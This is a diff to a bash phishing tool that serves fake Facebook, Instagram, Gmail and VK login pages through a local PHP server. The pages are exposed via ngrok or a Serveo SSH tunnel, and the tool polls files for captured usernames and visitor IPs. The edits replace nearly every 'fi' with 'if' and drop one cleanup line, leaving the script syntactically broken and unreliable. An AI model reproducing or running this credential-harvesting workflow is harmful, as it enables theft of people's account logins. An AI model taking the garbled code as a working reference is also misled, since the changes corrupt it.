@@ -124,7 +124,7 @@ printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;
 sleep 1
 banner
 menu
-fi
+if
 }
 facebook(){
 printf " \n"
@@ -151,7 +151,7 @@ printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;
 sleep 1
 banner
 menu
-fi
+if
 }
 instagram(){
 printf " \n"
@@ -174,7 +174,7 @@ printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;
 sleep 1
 banner
 menu
-fi
+if
 }
 gmail(){
 printf " \n"
@@ -197,7 +197,7 @@ printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;
 sleep 1
 banner
 menu
-fi
+if
 }
 vk(){
 printf " \n"
@@ -216,7 +216,7 @@ printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;
 sleep 1
 banner
 menu
-fi
+if
 }
 stop() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
@@ -225,15 +225,15 @@ checkssh=$(ps aux | grep -o "ssh" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
-fi
+if
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
-fi
+if
 if [[ $checkssh == *'ssh'* ]]; then
 pkill -f -2 ssh > /dev/null 2>&1
 killall ssh > /dev/null 2>&1
-fi
+if
 if [[ -e linksender ]]; then
 rm -rf linksender
 fi
@@ -241,7 +241,7 @@ fi
 start() {
 if [[ -e linksender ]]; then
 rm -rf linksender
-fi
+if
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m LocalHost\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
@@ -264,15 +264,15 @@ printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;
 sleep 1
 banner
 start
-fi
+if
 }
 start_s() {
 if [[ -e websites/$server/ip.txt ]]; then
 rm -rf websites/$server/ip.txt
-fi
+if
 if [[ -e websites/$server/usernames.txt ]]; then
 rm -rf websites/$server/usernames.txt
-fi
+if
 def_port="5555"
 printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
@@ -289,7 +289,7 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
 if [[ -e linksender ]]; then
 rm -rf linksender
-fi
+if
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
 printf "\n"
 sleep 7
@@ -301,11 +301,10 @@ found
 }
 start_n() {
 if [[ -e websites/$server/ip.txt ]]; then
-rm -rf websites/$server/ip.txt
-fi
+if
 if [[ -e websites/$server/usernames.txt ]]; then
 rm -rf websites/$server/usernames.txt
-fi
+if
 if [[ -e ngrok ]]; then
 echo ""
 else
@@ -322,7 +321,7 @@ rm -rf ngrok-stable-linux-arm.zip
 else
 printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
 exit 1
-fi
+if
 else
 curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-386.zip ]]; then
@@ -332,9 +331,9 @@ rm -rf ngrok-stable-linux-386.zip
 else
 printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
 exit 1
-fi
-fi
-fi
+if
+if
+if
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
 cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
@@ -371,7 +370,7 @@ while [ true ]; do
 if [[ -e "websites/$server/ip.txt" ]]; then
 c_ip
 rm -rf websites/$server/ip.txt
-fi
+if
 sleep 0.75
 if [[ -e "websites/$server/usernames.txt" ]]; then
 account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
@@ -385,7 +384,7 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m 
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
 rm -rf websites/$server/usernames.txt
-fi
+if
 sleep 0.75
 done
 }
@@ -422,7 +421,7 @@ printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\
 printf "\n"
 c_cred
 rm -rf websites/$server/usernames.txt
-fi
+if
 sleep 0.75
 done
 }
